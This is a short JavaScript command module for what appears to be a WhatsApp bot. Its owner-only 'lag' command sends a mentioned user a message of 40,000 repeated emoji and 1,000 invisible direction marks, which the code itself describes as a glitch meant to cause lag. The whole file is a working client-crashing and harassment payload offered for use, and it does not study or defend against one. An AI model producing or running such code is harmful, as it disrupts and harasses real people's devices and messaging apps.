export const name = 'lag';
export const description = 'Send glitchy message to cause lag (owner only)';
export const category = 'Owner';

export async function execute(sock, msg, args, context) {
  const { senderJid, isBotOwner, sendReply, mentionedJid } = context;
  const where = msg.key.remoteJid;

  if (!isBotOwner) return sendReply(where, '🚫 Owner only.');

  const target = mentionedJid?.[0];
  if (!target) return sendReply(where, '⚠️ Mention a user to lag.\n\nUsage: .lag @user');

  await sendReply(where, `⚠️ Sending glitch message to @${target.split('@')[0]}...`, {
    mentions: [target]
  });

  // Huge laggy message
  const glitchText = '👾'.repeat(40000) + '\u200E'.repeat(1000);

  await sock.sendMessage(target, {
    text: glitchText
  });

  return sendReply(where, '✅ Lag message sent.');
}
